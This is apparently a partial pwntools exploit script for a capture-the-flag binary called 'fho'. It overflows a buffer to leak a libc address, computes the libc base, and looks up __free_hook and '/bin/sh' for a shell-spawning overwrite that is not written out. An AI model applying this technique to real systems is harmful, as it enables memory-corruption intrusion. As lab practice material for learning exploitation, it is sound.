from pwn import *

e = ELF('./fho')
libc = ELF('./libc-2.27.so')

p = process("./fho", env={"LD_PRELOAD":"./libc.so.6"})

FREE_HOOK_OFFSET = libc.symbols["__free_hook"]
BIN_SH_OFFSET = list(libc.search(b"/bin/sh\x00"))[0]
LIBC_MAIN_OFFSET = libc.symbols["__libc_start_main"]


PAYLOAD1 = b'\x41' * 0x48

p.sendafter('Buf: ', PAYLOAD1)
p.recvuntil(PAYLOAD1)

LIBC_MAIN_XX = u64(p.recvn(6) + b'\x00' * 2) - 124

print(hex(LIBC_MAIN_XX))
print(hex(LIBC_MAIN_OFFSET))

LIBC_BASE = (LIBC_MAIN_XX) - ( LIBC_MAIN_OFFSET )

print(hex(LIBC_BASE))

pause()